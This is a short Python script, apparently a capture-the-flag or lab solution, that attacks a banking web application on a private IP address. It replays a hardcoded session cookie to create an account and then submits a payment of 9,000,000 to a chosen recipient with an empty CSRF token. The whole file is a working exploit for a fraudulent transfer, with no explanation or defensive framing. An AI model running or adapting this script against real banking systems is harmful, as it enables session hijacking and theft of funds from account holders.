
import requests


def create_account():
    url = 'http://192.168.0.100/Accounts/New'
    cookies = {
        "fsr.s": "{\"v\":1}",
        "fsr.a": "1553322785320",
        'JSESSIONID': '4023F620CF10AAC6B3FA4905BD05FAAF',
    }
    data = {
        'accountType': '0'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://192.168.0.100/Accounts/New',
        'Host': '192.168.0.100',
        'Accept-Encoding': 'gzip, deflate',
    }

    res = requests.post(url, headers=headers, cookies=cookies, data=data)

    if 'New Account added successfully' in res.text:
        return "Success"
    else:
        return res.text
# print(create_account())


def solve():
    url = 'http://192.168.0.100/Payments/New'
    cookies = {
        "fsr.s": "{\"v\":1}",
        "fsr.a": "1553322785320",
        'JSESSIONID': '4023F620CF10AAC6B3FA4905BD05FAAF',
    }
    data = {
        "PaymentType": "0",
        "SourceAccountId": "88",
        "RecipientAccountNumber": "76691775",
        "RecipientAccountSortCode": "930747",
        "Amount": "9000000.0",
        "Interval": "",
        "SendDate": "Immediately",
        "Reference": "",
        "csrf-token": "",
        "SubmitType": "submit",
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://192.168.0.100/Accounts/New',
        'Host': '192.168.0.100',
        'Accept-Encoding': 'gzip, deflate',
    }

    res = requests.post(url, headers=headers, cookies=cookies, data=data)
    return res.text

print(solve())
